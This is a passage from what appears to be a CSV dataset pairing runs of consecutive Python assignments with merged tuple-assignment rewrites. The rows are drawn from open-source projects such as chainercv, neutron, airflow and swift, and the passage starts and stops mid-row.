    assert get_index(root, root.left) == 1
    assert get_index(root, root.right) == 2
    assert get_index(root, root.left.left) == 3
    assert get_index(root, root.right.right) == 6

    with pytest.raises(NodeReferenceError) as err1:
        get_index(root.left, root.right)
    assert str(err1.value) == ""given nodes are not in the same tree""

    with pytest.raises(NodeTypeError) as err2:
        get_index(root, None)  # type: ignore
    assert str(err2.value) == ""descendent must be a Node instance""

    with pytest.raises(NodeTypeError) as err3:
        get_index(None, root.left)  # type: ignore
    assert str(err3.value) == ""root must be a Node instance""","root.left.left = Node(3)
root.right.right = Node(4)","root.left.left , root.right.right  = Node(3), Node(4)"
flow,https://github.com/flow-project/flow/tree/master/flow/controllers/car_following_models.py,BCMController,__init__$128,"def __init__(self,
                 veh_id,
                 car_following_params,
                 k_d=1,
                 k_v=1,
                 k_c=1,
                 d_des=1,
                 v_des=8,
                 time_delay=0.0,
                 noise=0,
                 fail_safe=None,
                 display_warnings=True):
        """"""Instantiate a Bilateral car-following model controller.""""""
        BaseController.__init__(
            self,
            veh_id,
            car_following_params,
            delay=time_delay,
            fail_safe=fail_safe,
            noise=noise,
            display_warnings=display_warnings,
        )

        self.veh_id = veh_id
        self.k_d = k_d
        self.k_v = k_v
        self.k_c = k_c
        self.d_des = d_des
        self.v_des = v_des","self.veh_id = veh_id
self.k_d = k_d
self.k_v = k_v
self.k_c = k_c
self.d_des = d_des
self.v_des = v_des","self.veh_id , self.k_d , self.k_v , self.k_c , self.d_des , self.v_des  = veh_id, k_d, k_v, k_c, d_des, v_des"
chainercv,https://github.com/chainer/chainercv/tree/master/chainercv/extensions/evaluator/semantic_segmentation_evaluator.py,SemanticSegmentationEvaluator,evaluate$79,"def evaluate(self):
        target = self._targets['main']
        if self.comm is not None and self.comm.rank != 0:
            apply_to_iterator(target.predict, None, comm=self.comm)
            return {}
        iterator = self._iterators['main']

        if hasattr(iterator, 'reset'):
            iterator.reset()
            it = iterator
        else:
            it = copy.copy(iterator)

        in_values, out_values, rest_values = apply_to_iterator(
            target.predict, it, comm=self.comm)
        # delete unused iterators explicitly
        del in_values

        pred_labels, = out_values
        gt_labels, = rest_values

        result = eval_semantic_segmentation(pred_labels, gt_labels)

        report = {'miou': result['miou'],
                  'pixel_accuracy': result['pixel_accuracy'],
                  'mean_class_accuracy': result['mean_class_accuracy']}

        if self.label_names is not None:
            for l, label_name in enumerate(self.label_names):
                try:
                    report['iou/{:s}'.format(label_name)] = result['iou'][l]
                    report['class_accuracy/{:s}'.format(label_name)] =\
                        result['class_accuracy'][l]
                except IndexError:
                    report['iou/{:s}'.format(label_name)] = np.nan
                    report['class_accuracy/{:s}'.format(label_name)] = np.nan

        observation = {}
        with reporter.report_scope(observation):
            reporter.report(report, target)
        return observation","(pred_labels,) = out_values
(gt_labels,) = rest_values","(pred_labels,) , (gt_labels,)  = out_values, rest_values"
chainercv,https://github.com/chainer/chainercv/tree/master/chainercv/extensions/evaluator/semantic_segmentation_evaluator.py,SemanticSegmentationEvaluator,evaluate$79,"def evaluate(self):
        target = self._targets['main']
        if self.comm is not None and self.comm.rank != 0:
            apply_to_iterator(target.predict, None, comm=self.comm)
            return {}
        iterator = self._iterators['main']

        if hasattr(iterator, 'reset'):
            iterator.reset()
            it = iterator
        else:
            it = copy.copy(iterator)

        in_values, out_values, rest_values = apply_to_iterator(
            target.predict, it, comm=self.comm)
        # delete unused iterators explicitly
        del in_values

        pred_labels, = out_values
        gt_labels, = rest_values

        result = eval_semantic_segmentation(pred_labels, gt_labels)

        report = {'miou': result['miou'],
                  'pixel_accuracy': result['pixel_accuracy'],
                  'mean_class_accuracy': result['mean_class_accuracy']}

        if self.label_names is not None:
            for l, label_name in enumerate(self.label_names):
                try:
                    report['iou/{:s}'.format(label_name)] = result['iou'][l]
                    report['class_accuracy/{:s}'.format(label_name)] =\
                        result['class_accuracy'][l]
                except IndexError:
                    report['iou/{:s}'.format(label_name)] = np.nan
                    report['class_accuracy/{:s}'.format(label_name)] = np.nan

        observation = {}
        with reporter.report_scope(observation):
            reporter.report(report, target)
        return observation","report['iou/{:s}'.format(label_name)] = result['iou'][l]
report['class_accuracy/{:s}'.format(label_name)] = result['class_accuracy'][l]","report['iou/{:s}'.format(label_name)] , report['class_accuracy/{:s}'.format(label_name)]  = result['iou'][l], result['class_accuracy'][l]"
chainercv,https://github.com/chainer/chainercv/tree/master/chainercv/extensions/evaluator/semantic_segmentation_evaluator.py,SemanticSegmentationEvaluator,evaluate$79,"def evaluate(self):
        target = self._targets['main']
        if self.comm is not None and self.comm.rank != 0:
            apply_to_iterator(target.predict, None, comm=self.comm)
            return {}
        iterator = self._iterators['main']

        if hasattr(iterator, 'reset'):
            iterator.reset()
            it = iterator
        else:
            it = copy.copy(iterator)

        in_values, out_values, rest_values = apply_to_iterator(
            target.predict, it, comm=self.comm)
        # delete unused iterators explicitly
        del in_values

        pred_labels, = out_values
        gt_labels, = rest_values

        result = eval_semantic_segmentation(pred_labels, gt_labels)

        report = {'miou': result['miou'],
                  'pixel_accuracy': result['pixel_accuracy'],
                  'mean_class_accuracy': result['mean_class_accuracy']}

        if self.label_names is not None:
            for l, label_name in enumerate(self.label_names):
                try:
                    report['iou/{:s}'.format(label_name)] = result['iou'][l]
                    report['class_accuracy/{:s}'.format(label_name)] =\
                        result['class_accuracy'][l]
                except IndexError:
                    report['iou/{:s}'.format(label_name)] = np.nan
                    report['class_accuracy/{:s}'.format(label_name)] = np.nan

        observation = {}
        with reporter.report_scope(observation):
            reporter.report(report, target)
        return observation","report['iou/{:s}'.format(label_name)] = np.nan
report['class_accuracy/{:s}'.format(label_name)] = np.nan","report['iou/{:s}'.format(label_name)] , report['class_accuracy/{:s}'.format(label_name)]  = np.nan, np.nan"
sentry,https://github.com/getsentry/sentry/tree/master/tests/acceptance/test_organization_events_v2.py,OrganizationEventsV2Test,test_errors_query$247,"def test_errors_query(self, mock_now):
        now = before_now().replace(tzinfo=pytz.utc)
        mock_now.return_value = now
        ten_mins_ago = iso_format(now - timedelta(minutes=10))
        self.store_event(
            data={
                ""event_id"": ""a"" * 32,
                ""message"": ""oh no"",
                ""timestamp"": ten_mins_ago,
                ""fingerprint"": [""group-1""],
                ""type"": ""error"",
            },
            project_id=self.project.id,
            assert_no_errors=False,
        )
        self.store_event(
            data={
                ""event_id"": ""b"" * 32,
                ""message"": ""oh no"",
                ""timestamp"": ten_mins_ago,
                ""fingerprint"": [""group-1""],
                ""type"": ""error"",
            },
            project_id=self.project.id,
            assert_no_errors=False,
        )
        self.store_event(
            data={
                ""event_id"": ""c"" * 32,
                ""message"": ""this is bad."",
                ""timestamp"": ten_mins_ago,
                ""fingerprint"": [""group-2""],
                ""type"": ""error"",
            },
            project_id=self.project.id,
            assert_no_errors=False,
        )

        with self.feature(FEATURE_NAMES):
            self.browser.get(self.result_path + ""?"" + errors_query())
            self.wait_until_loaded()
            self.browser.snapshot(""events-v2 - errors"")","mock_now.return_value = now
ten_mins_ago = iso_format(now - timedelta(minutes=10))","mock_now.return_value , ten_mins_ago  = now, iso_format(now - timedelta(minutes=10))"
neutron,https://github.com/openstack/neutron/tree/master/neutron/tests/unit/agent/dhcp/test_agent.py,TestDhcpAgentEventHandler,_test_enable_isolated_metadata_proxy_ipv6$1006,"def _test_enable_isolated_metadata_proxy_ipv6(self, network):
        cfg.CONF.set_override('enable_metadata_network', True)
        cfg.CONF.set_override('debug', True)
        cfg.CONF.set_override('log_file', 'test.log')
        method_path = ('neutron.agent.metadata.driver.MetadataDriver'
                       '.spawn_monitored_metadata_proxy')
        with mock.patch(method_path) as spawn, \
                mock.patch.object(netutils, 'is_ipv6_enabled') as mock_ipv6:
            mock_ipv6.return_value = True
            self.call_driver.return_value = 'fake-interface'
            self.dhcp.enable_isolated_metadata_proxy(network)
            spawn.assert_called_once_with(self.dhcp._process_monitor,
                                          network.namespace,
                                          const.METADATA_PORT,
                                          cfg.CONF,
                                          bind_address='169.254.169.254',
                                          network_id=network.id,
                                          bind_interface='fake-interface',
                                          bind_address_v6='fe80::a9fe:a9fe')","mock_ipv6.return_value = True
self.call_driver.return_value = 'fake-interface'","mock_ipv6.return_value , self.call_driver.return_value  = True, 'fake-interface'"
pycraft,https://github.com/traverseda/pycraft/tree/master/pycraft/world/world.py,World,initial_sector$253,"def initial_sector(self, coords):
        """"""
        Creates initial sectors in spiral, to speed up rendering in front of the player
        :param coords:
        :return:
        """"""
        x, y = 0, 0
        dx, dy = 0, -1
        X = coords[0] + 4
        Y = coords[2] + 4
        for i in range(max(X, Y) ** 2):
            if (-X / 2 < x <= X / 2) and (-Y / 2 < y <= Y / 2):
                self.show_sector((x, coords[1], y))
            if x == y or (x < 0 and x == -y) or (x > 0 and x == 1 - y):
                dx, dy = -dy, dx  # Corner change direction
            x, y = x + dx, y + dy","X = coords[0] + 4
Y = coords[2] + 4","X , Y  = coords[0] + 4, coords[2] + 4"
ludwig,https://github.com/ludwig-ai/ludwig/tree/master/ludwig/encoders/text_encoders.py,GPTEncoder,__init__$650,"def __init__(
            self,
            max_sequence_length: int,
            reduce_output: str = 'sum',
            use_pretrained: bool = True,
            pretrained_model_name_or_path: str = 'openai-gpt',
            trainable: bool = True,
            vocab_size: int = 30522,
            n_positions: int = 40478,
            n_ctx: int = 512,
            n_embd: int = 768,
            n_layer: int = 12,
            n_head: int = 12,
            afn: str = 'gelu',
            resid_pdrop: float = 0.1,
            embd_pdrop: float = 0.1,
            attn_pdrop: float = 0.1,
            layer_norm_epsilon: float = 1e-5,
            initializer_range: float = 0.02,
            **kwargs
    ):
        super().__init__()
        try:
            from transformers import OpenAIGPTModel, OpenAIGPTConfig
        except ModuleNotFoundError:
            logger.error(
                ' transformers is not installed. '
                'In order to install all text feature dependencies run '
                'pip install ludwig[text]'
            )
            sys.exit(-1)

        if use_pretrained:
            self.transformer = OpenAIGPTModel.from_pretrained(
                pretrained_model_name_or_path
            )
        else:
            config = OpenAIGPTConfig(
                vocab_size=vocab_size,
                n_positions=n_positions,
                n_ctx=n_ctx,
                n_embd=n_embd,
                n_layer=n_layer,
                n_head=n_head,
                afn=afn,
                resid_pdrop=resid_pdrop,
                embd_pdrop=embd_pdrop,
                attn_pdrop=attn_pdrop,
                layer_norm_epsilon=layer_norm_epsilon,
                initializer_range=initializer_range,
            )
            self.transformer = OpenAIGPTModel(config)

        self.reduce_output = reduce_output
        self.reduce_sequence = SequenceReducer(reduce_mode=reduce_output)
        if trainable:
            self.transformer.train()
        self.transformer.resize_token_embeddings(vocab_size)
        self.max_sequence_length = max_sequence_length","self.reduce_output = reduce_output
self.reduce_sequence = SequenceReducer(reduce_mode=reduce_output)","self.reduce_output , self.reduce_sequence  = reduce_output, SequenceReducer(reduce_mode=reduce_output)"
saleor,https://github.com/saleor/saleor/tree/master/saleor/graphql/attribute/tests/test_utils.py,,test_validate_multiselect_attribute_duplicated_values$1559,"def test_validate_multiselect_attribute_duplicated_values(
    creation, weight_attribute, product_type
):
    # given
    weight_attribute.input_type = AttributeInputType.MULTISELECT
    weight_attribute.value_required = True
    weight_attribute.save(update_fields=[""value_required"", ""input_type""])

    input_data = [
        (
            weight_attribute,
            AttrValuesInput(
                global_id=graphene.Node.to_global_id(""Attribute"", weight_attribute.pk),
                multiselect=[
                    AttrValuesForSelectableFieldInput(value=""new weight""),
                    AttrValuesForSelectableFieldInput(value=""new weight""),
                    AttrValuesForSelectableFieldInput(value=""new weight 2""),
                ],
            ),
        ),
    ]

    # when
    errors = validate_attributes_input(
        input_data,
        product_type.product_attributes.all(),
        is_page_attributes=False,
        creation=creation,
    )

    # then
    assert len(errors) == 1
    assert errors[0].code == ProductErrorCode.DUPLICATED_INPUT_ITEM.value","weight_attribute.input_type = AttributeInputType.MULTISELECT
weight_attribute.value_required = True","weight_attribute.input_type , weight_attribute.value_required  = AttributeInputType.MULTISELECT, True"
st2,https://github.com/StackStorm/st2/tree/master/st2client/tests/unit/test_util_strutil.py,StrUtilTestCase,test_unescape$27,"def test_unescape(self):
        in_str = 'Action execution result double escape \\""stuffs\\"".\\r\\n'
        expected = 'Action execution result double escape ""stuffs"".\r\n'
        out_str = strutil.unescape(in_str)
        self.assertEqual(out_str, expected)","expected = 'Action execution result double escape ""stuffs"".\r\n'
out_str = strutil.unescape(in_str)","expected , out_str  = 'Action execution result double escape ""stuffs"".\r\n', strutil.unescape(in_str)"
airflow,https://github.com/apache/airflow/tree/master/tests/providers/apache/druid/hooks/test_druid.py,TestDruidHook,test_submit_gone_wrong$45,"def test_submit_gone_wrong(self, m):
        task_post = m.post(
            'http://druid-overlord:8081/druid/indexer/v1/task',
            text='{""task"":""9f8a7359-77d4-4612-b0cd-cc2f6a3c28de""}',
        )
        status_check = m.get(
            'http://druid-overlord:8081/druid/indexer/v1/task/9f8a7359-77d4-4612-b0cd-cc2f6a3c28de/status',
            text='{""status"":{""status"": ""FAILED""}}',
        )

        # The job failed for some reason
        with pytest.raises(AirflowException):
            self.db_hook.submit_indexing_job('Long json file')

        assert task_post.called_once
        assert status_check.called_once","task_post = m.post('http://druid-overlord:8081/druid/indexer/v1/task', text='{""task"":""9f8a7359-77d4-4612-b0cd-cc2f6a3c28de""}')
status_check = m.get('http://druid-overlord:8081/druid/indexer/v1/task/9f8a7359-77d4-4612-b0cd-cc2f6a3c28de/status', text='{""status"":{""status"": ""FAILED""}}')","task_post , status_check  = m.post('http://druid-overlord:8081/druid/indexer/v1/task', text='{""task"":""9f8a7359-77d4-4612-b0cd-cc2f6a3c28de""}'), m.get('http://druid-overlord:8081/druid/indexer/v1/task/9f8a7359-77d4-4612-b0cd-cc2f6a3c28de/status', text='{""status"":{""status"": ""FAILED""}}')"
maml_rl,https://github.com/cbfinn/maml_rl/tree/master/rllab/algos/util.py,,speed_tests$299,"def speed_tests():
    dataset = ReplayPool(
        observation_shape=(80, 80),
        action_dim=1,
        max_steps=20000,
        concat_observations=True,
        concat_length=4,
    )

    img = np.random.randint(0, 256, size=(80, 80))
    action = np.random.randint(16)
    reward = np.random.random()
    start = time.time()
    for _ in range(100000):
        terminal = False
        if np.random.random() < .05:
            terminal = True
        dataset.add_sample(img, action, reward, terminal)
    print(""samples per second: "", 100000 / (time.time() - start))

    start = time.time()
    for _ in range(200):
        dataset.random_batch(32)
    print(""batches per second: "", 200 / (time.time() - start))

    print(dataset.last_concat_state())","dataset = ReplayPool(observation_shape=(80, 80), action_dim=1, max_steps=20000, concat_observations=True, concat_length=4)
img = np.random.randint(0, 256, size=(80, 80))
action = np.random.randint(16)
reward = np.random.random()
start = time.time()","dataset , img , action , reward , start  = ReplayPool(observation_shape=(80, 80), action_dim=1, max_steps=20000, concat_observations=True, concat_length=4), np.random.randint(0, 256, size=(80, 80)), np.random.randint(16), np.random.random(), time.time()"
MixNMatch,https://github.com/Yuheng-Li/MixNMatch/tree/master/code/eval.py,,eval_feature$125,"def eval_feature():

    names = [ os.path.join(MODELS,'G.pth'), os.path.join(MODELS,'E.pth'), os.path.join(MODELS,'EX.pth')  ]
    netG, encoder, extractor = load_network(names)   
    
       
    real_img_b  = get_images(B) 
    real_img_p  = get_images(P)            
    real_img_c  = get_images(C)            


    with torch.no_grad():
        shape_feature = extractor( real_img_p.to(device) )
        fake_z1, fake_b, _, _ = encoder( real_img_b.to(device), 'softmax' )
        _, _, _, fake_c = encoder( real_img_c.to(device), 'softmax' )     
        
        fake_imgs, _, _, _ = netG(fake_z1, None, fake_c, shape_feature, fake_b, 'feature' )
        img = fake_imgs[2]       


    save_img(img, OUT)","real_img_b = get_images(B)
real_img_p = get_images(P)
real_img_c = get_images(C)","real_img_b , real_img_p , real_img_c  = get_images(B), get_images(P), get_images(C)"
elasticdl,https://github.com/sql-machine-learning/elasticdl/tree/master/elasticdl/python/common/k8s_client.py,Client,__init__$42,"def __init__(
        self,
        *,
        image_name,
        namespace,
        job_name,
        event_callback=None,
        periodic_call_func=None,
        cluster_spec="""",
        cluster_spec_json="""",
        force_use_kube_config_file=False
    ):
        """"""
        ElasticDL k8s client.

        Args:
            image_name: Docker image path for ElasticDL pod.
            namespace: The name of the Kubernetes namespace where ElasticDL
                pods will be created.
            job_name: ElasticDL job name, should be unique in the namespace.
                Used as pod name prefix and value for ""elasticdl"" label.
            event_callback: If not None, an event watcher will be created and
                events passed to the callback.
            periodic_call_func: If not None, call this method periodically.
            force_use_kube_config_file: If true, force to load the cluster
                config from ~/.kube/config. Otherwise, if it's in a process
                running in a K8S environment, it loads the incluster config,
                if not, it loads the kube config file.
        """"""
        super().__init__(
            image_name=image_name,
            namespace=namespace,
            job_name=job_name,
            cluster_spec=cluster_spec,
            cluster_spec_json=cluster_spec_json,
            force_use_kube_config_file=force_use_kube_config_file,
        )
        self._event_cb = event_callback
        self._periodic_call_func = periodic_call_func","self._event_cb = event_callback
self._periodic_call_func = periodic_call_func","self._event_cb , self._periodic_call_func  = event_callback, periodic_call_func"
swift,https://github.com/openstack/swift/tree/master/test/unit/common/middleware/s3api/test_bucket.py,TestS3ApiBucket,test_bucket_GET_versions_with_key_marker_and_version_id_marker$831,"def test_bucket_GET_versions_with_key_marker_and_version_id_marker(self):
        container_listing = [{
            ""bytes"": 8192,
            ""content_type"": ""binary/octet-stream"",
            ""hash"": ""221994040b14294bdf7fbc128e66633c"",
            ""last_modified"": ""2019-08-16T19:39:53.152780"",
            ""name"": ""subdir/foo"",
        }]
        versions_listing = [{
            'bytes': 0,
            'content_type': DELETE_MARKER_CONTENT_TYPE,
            'hash': '0',
            ""last_modified"": ""2019-08-19T19:05:33.565940"",
            'name': 'subdir/bar',
            ""version_id"": ""1565241533.55320"",
            'is_latest': True,
        }, {
            ""bytes"": 8192,
            ""content_type"": ""binary/octet-stream"",
            ""hash"": ""221994040b14294bdf7fbc128e66633c"",
            ""last_modified"": ""2019-08-16T19:39:53.508510"",
            ""name"": ""subdir/bar"",
            ""version_id"": ""1564984393.68962"",
            'is_latest': False,
        }, {
            ""bytes"": 8192,
            ""content_type"": ""binary/octet-stream"",
            ""hash"": ""221994040b14294bdf7fbc128e66633c"",
            ""last_modified"": ""2019-08-16T19:39:42.673260"",
            ""name"": ""subdir/foo"",
            ""version_id"": ""1565984382.67326"",
            'is_latest': False,
        }]
        self._add_versions_request(container_listing, versions_listing,
                                   bucket='mybucket')
        req = Request.blank(
            '/mybucket?versions&key-marker=subdir/bar&'
            'version-id-marker=1566589611.065522',
            environ={'REQUEST_METHOD': 'GET'},
            headers={'Authorization': 'AWS test:tester:hmac',
                     'Date': self.get_date_header()})
        status, headers, body = self.call_s3api(req)
        self.assertEqual(status.split()[0], '200')
        elem = fromstring(body, 'ListVersionsResult')
        self.assertEqual(elem.find('./IsTruncated').text, 'false')
        delete_markers = elem.findall('./DeleteMarker')
        self.assertEqual(['subdir/bar'], [
            o.find('Key').text for o in delete_markers])
        expected = [
            ('subdir/bar', 'false', '1564984393.68962'),
            ('subdir/foo', 'true', 'null'),
            ('subdir/foo', 'false', '1565984382.67326'),
        ]
        discovered = [
            tuple(e.find('./%s' % key).text for key in (
                'Key', 'IsLatest', 'VersionId'))
            for e in elem.findall('./Version')
        ]
        self.assertEqual(expected, discovered)

        self._add_versions_request(container_listing, versions_listing[1:],
                                   bucket='mybucket')
        req = Request.blank(
            '/mybucket?versions&key-marker=subdir/bar&'
            'version-id-marker=1565241533.55320',
            environ={'REQUEST_METHOD': 'GET'},
            headers={'Authorization': 'AWS test:tester:hmac',
                     'Date': self.get_date_header()})
        status, headers, body = self.call_s3api(req)
        self.assertEqual(status.split()[0], '200')
        elem = fromstring(body, 'ListVersionsResult')
        self.assertEqual(elem.find('./IsTruncated').text, 'false')
        delete_markers = elem.findall('./DeleteMarker')
        self.assertEqual(0, len(delete_markers))
        expected = [
            ('subdir/bar', 'false', '1564984393.68962'),
            ('subdir/foo', 'true', 'null'),
            ('subdir/foo', 'false', '1565984382.67326'),
        ]
        discovered = [
            tuple(e.find('./%s' % key).text for key in (
                'Key', 'IsLatest', 'VersionId'))
            for e in elem.findall('./Version')
        ]
        self.assertEqual(expected, discovered)

        self._add_versions_request([], versions_listing[-1:],
                                   bucket='mybucket')
        req = Request.blank(
            '/mybucket?versions&key-marker=subdir/foo&'
            'version-id-marker=null',
            environ={'REQUEST_METHOD': 'GET'},
            headers={'Authorization': 'AWS test:tester:hmac',
                     'Date': self.get_date_header()})
        status, headers, body = self.call_s3api(req)
        self.assertEqual(status.split()[0], '200')
        elem = fromstring(body, 'ListVersionsResult')
        self.assertEqual(elem.find('./IsTruncated').text, 'false')
        delete_markers = elem.findall('./DeleteMarker')
        self.assertEqual(0, len(delete_markers))
        expected = [
            ('subdir/foo', 'false', '1565984382.67326'),
        ]
        discovered = [
            tuple(e.find('./%s' % key).text for key in (
                'Key', 'IsLatest', 'VersionId'))
            for e in elem.findall('./Version')
        ]
        self.assertEqual(expected, discovered)","container_listing = [{'bytes': 8192, 'content_type': 'binary/octet-stream', 'hash': '221994040b14294bdf7fbc128e66633c', 'last_modified': '2019-08-16T19:39:53.152780', 'name': 'subdir/foo'}]
versions_listing = [{'bytes': 0, 'content_type': DELETE_MARKER_CONTENT_TYPE, 'hash': '0', 'last_modified': '2019-08-19T19:05:33.565940', 'name': 'subdir/bar', 'version_id': '1565241533.55320', 'is_latest': True}, {'bytes': 8192, 'content_type': 'binary/octet-stream', 'hash': '221994040b14294bdf7fbc128e66633c', 'last_modified': '2019-08-16T19:39:53.508510', 'name': 'subdir/bar', 'version_id': '1564984393.68962', 'is_latest': False}, {'bytes': 8192, 'content_type': 'binary/octet-stream', 'hash': '221994040b14294bdf7fbc128e66633c', 'last_modified': '2019-08-16T19:39:42.673260', 'name': 'subdir/foo', 'version_id': '1565984382.67326', 'is_latest': False}]","container_listing , versions_listing  = [{'bytes': 8192, 'content_type': 'binary/octet-stream', 'hash': '221994040b14294bdf7fbc128e66633c', 'last_modified': '2019-08-16T19:39:53.152780', 'name': 'subdir/foo'}], [{'bytes': 0, 'content_type': DELETE_MARKER_CONTENT_TYPE, 'hash': '0', 'last_modified': '2019-08-19T19:05:33.565940', 'name': 'subdir/bar', 'version_id': '1565241533.55320', 'is_latest': True}, {'bytes': 8192, 'content_type': 'binary/octet-stream', 'hash': '221994040b14294bdf7fbc128e66633c', 'last_modified': '2019-08-16T19:39:53.508510', 'name': 'subdir/bar', 'version_id': '1564984393.68962', 'is_latest': False}, {'bytes': 8192, 'content_type': 'binary/octet-stream', 'hash': '221994040b14294bdf7fbc128e66633c', 'last_modified': '2019-08-16T19:39:42.673260', 'name': 'subdir/foo', 'version_id': '1565984382.67326', 'is_latest': False}]"
swift,https://github.com/openstack/swift/tree/master/test/unit/common/middleware/s3api/test_bucket.py,TestS3ApiBucket,test_bucket_GET_versions_with_key_marker_and_version_id_marker$831,"def test_bucket_GET_versions_with_key_marker_and_version_id_marker(self):
        container_listing = [{
            ""bytes"": 8192,
            ""content_type"": ""binary/octet-stream"",
            ""hash"": ""221994040b14294bdf7fbc128e66633c"",
            ""last_modified"": ""2019-08-16T19:39:53.152780"",
            ""name"": ""subdir/foo"",
        }]
        versions_listing = [{
            'bytes': 0,
            'content_type': DELETE_MARKER_CONTENT_TYPE,
            'hash': '0',
            ""last_modified"": ""2019-08-19T19:05:33.565940"",
            'name': 'subdir/bar',
            ""version_id"": ""1565241533.55320"",
            'is_latest': True,
        }, {
            ""bytes"": 8192,
            ""content_type"": ""binary/octet-stream"",
            ""hash"": ""221994040b14294bdf7fbc128e66633c"",
            ""last_modified"": ""2019-08-16T19:39:53.508510"",
            ""name"": ""subdir/bar"",
            ""version_id"": ""1564984393.68962"",
            'is_latest': False,
        }, {
            ""bytes"": 8192,
            ""content_type"": ""binary/octet-stream"",
            ""hash"": ""221994040b14294bdf7fbc128e66633c"",
            ""last_modified"": ""2019-08-16T19:39:42.673260"",
            ""name"": ""subdir/foo"",
            ""version_id"": ""1565984382.67326"",
            'is_latest': False,
        }]
        self._add_versions_request(container_listing, versions_listing,
                                   bucket='mybucket')
        req = Request.blank(
            '/mybucket?versions&key-marker=subdir/bar&'
            'version-id-marker=1566589611.065522',
            environ={'REQUEST_METHOD': 'GET'},
            headers={'Authorization': 'AWS test:tester:hmac',
                     'Date': self.get_date_header()})
        status, headers, body = self.call_s3api(req)
        self.assertEqual(status.split()[0], '200')
        elem = fromstring(body, 'ListVersionsResult')
        self.assertEqual(elem.find('./IsTruncated').text, 'false')
        delete_markers = elem.findall('./DeleteMarker')
        self.assertEqual(['subdir/bar'], [
            o.find('Key').text for o in delete_markers])
        expected = [
            ('subdir/bar', 'false', '1564984393.68962'),
            ('subdir/foo', 'true', 'null'),
            ('subdir/foo', 'false', '1565984382.67326'),
        ]
        discovered = [
            tuple(e.find('./%s' % key).text for key in (
                'Key', 'IsLatest', 'VersionId'))
            for e in elem.findall('./Version')
        ]
        self.assertEqual(expected, discovered)

        self._add_versions_request(container_listing, versions_listing[1:],
                                   bucket='mybucket')
        req = Request.blank(
            '/mybucket?versions&key-marker=subdir/bar&'
            'version-id-marker=1565241533.55320',
            environ={'REQUEST_METHOD': 'GET'},
            headers={'Authorization': 'AWS test:tester:hmac',
                     'Date': self.get_date_header()})
        status, headers, body = self.call_s3api(req)
        self.assertEqual(status.split()[0], '200')
        elem = fromstring(body, 'ListVersionsResult')
        self.assertEqual(elem.find('./IsTruncated').text, 'false')
        delete_markers = elem.findall('./DeleteMarker')
        self.assertEqual(0, len(delete_markers))
        expected = [
            ('subdir/bar', 'false', '1564984393.68962'),
            ('subdir/foo', 'true', 'null'),
            ('subdir/foo', 'false', '1565984382.67326'),
        ]
        discovered = [
            tuple(e.find('./%s' % key).text for key in (
                'Key', 'IsLatest', 'VersionId'))
            for e in elem.findall('./Version')
        ]
        self.assertEqual(expected, discovered)

        self._add_versions_request([], versions_listing[-1:],
                                   bucket='mybucket')
        req = Request.blank(
            '/mybucket?versions&key-marker=subdir/foo&'
            'version-id-marker=null',
            environ={'REQUEST_METHOD': 'GET'},
            headers={'Authorization': 'AWS test:tester:hmac',
                     'Date': self.get_date_header()})
        status, headers, body = self.call_s3api(req)
        self.assertEqual(status.split()[0], '200')
        elem = fromstring(body, 'ListVersionsResult')
        self.assertEqual(elem.find('./IsTruncated').text, 'false')
        delete_markers = elem.findall('./DeleteMarker')
        self.assertEqual(0, len(delete_markers))
        expected = [
            ('subdir/foo', 'false', '1565984382.67326'),
        ]
        discovered = [
            tuple(e.find('./%s' % key).text for key in (
                'Key', 'IsLatest', 'VersionId'))
            for e in elem.findall('./Version')
        ]
        self.assertEqual(expected, discovered)","expected = [('subdir/bar', 'false', '1564984393.68962'), ('subdir/foo', 'true', 'null'), ('subdir/foo', 'false', '1565984382.67326')]
discovered = [tuple((e.find('./%s' % key).text for key in ('Key', 'IsLatest', 'VersionId'))) for e in elem.findall('./Version')]","expected , discovered  = [('subdir/bar', 'false', '1564984393.68962'), ('subdir/foo', 'true', 'null'), ('subdir/foo', 'false', '1565984382.67326')], [tuple((e.find('./%s' % key).text for key in ('Key', 'IsLatest', 'VersionId'))) for e in elem.findall('./Version')]"
swift,https://github.com/openstack/swift/tree/master/test/unit/common/middleware/s3api/test_bucket.py,TestS3ApiBucket,test_bucket_GET_versions_with_key_marker_and_version_id_marker$831,"def test_bucket_GET_versions_with_key_marker_and_version_id_marker(self):
        container_listing = [{
            ""bytes"": 8192,
            ""content_type"": ""binary/octet-stream"",
            ""hash"": ""221994040b14294bdf7fbc128e66633c"",
            ""last_modified"": ""2019-08-16T19:39:53.152780"",
            ""name"": ""subdir/foo"",
        }]
        versions_listing = [{
            'bytes': 0,
            'content_type': DELETE_MARKER_CONTENT_TYPE,
            'hash': '0',
            ""last_modified"": ""2019-08-19T19:05:33.565940"",
            'name': 'subdir/bar',
            ""version_id"": ""1565241533.55320"",
            'is_latest': True,
        }, {
            ""bytes"": 8192,
            ""content_type"": ""binary/octet-stream"",
            ""hash"": ""221994040b14294bdf7fbc128e66633c"",
            ""last_modified"": ""2019-08-16T19:39:53.508510"",
            ""name"": ""subdir/bar"",
            ""version_id"": ""1564984393.68962"",
            'is_latest': False,
        }, {
            ""bytes"": 8192,
            ""content_type"": ""binary/octet-stream"",
            ""hash"": ""221994040b14294bdf7fbc128e66633c"",
            ""last_modified"": ""2019-08-16T19:39:42.673260"",
            ""name"": ""subdir/foo"",
            ""version_id"": ""1565984382.67326"",
            'is_latest': False,
        }]
        self._add_versions_request(container_listing, versions_listing,
                                   bucket='mybucket')
        req = Request.blank(
            '/mybucket?versions&key-marker=subdir/bar&'
            'version-id-marker=1566589611.065522',
            environ={'REQUEST_METHOD': 'GET'},
            headers={'Authorization': 'AWS test:tester:hmac',
                     'Date': self.get_date_header()})
        status, headers, body = self.call_s3api(req)
        self.assertEqual(status.split()[0], '200')
        elem = fromstring(body, 'ListVersionsResult')
        self.assertEqual(elem.find('./IsTruncated').text, 'false')
        delete_markers = elem.findall('./DeleteMarker')
        self.assertEqual(['subdir/bar'], [
            o.find('Key').text for o in delete_markers])
        expected = [
            ('subdir/bar', 'false', '1564984393.68962'),
            ('subdir/foo', 'true', 'null'),
            ('subdir/foo', 'false', '1565984382.67326'),
        ]
        discovered = [
            tuple(e.find('./%s' % key).text for key in (
                'Key', 'IsLatest', 'VersionId'))
            for e in elem.findall('./Version')
        ]
        self.assertEqual(expected, discovered)

        self._add_versions_request(container_listing, versions_listing[1:],
                                   bucket='mybucket')
        req = Request.blank(
            '/mybucket?versions&key-marker=subdir/bar&'
            'version-id-marker=1565241533.55320',
            environ={'REQUEST_METHOD': 'GET'},
            headers={'Authorization': 'AWS test:tester:hmac',
                     'Date': self.get_date_header()})
        status, headers, body = self.call_s3api(req)
        self.assertEqual(status.split()[0], '200')
        elem = fromstring(body, 'ListVersionsResult')
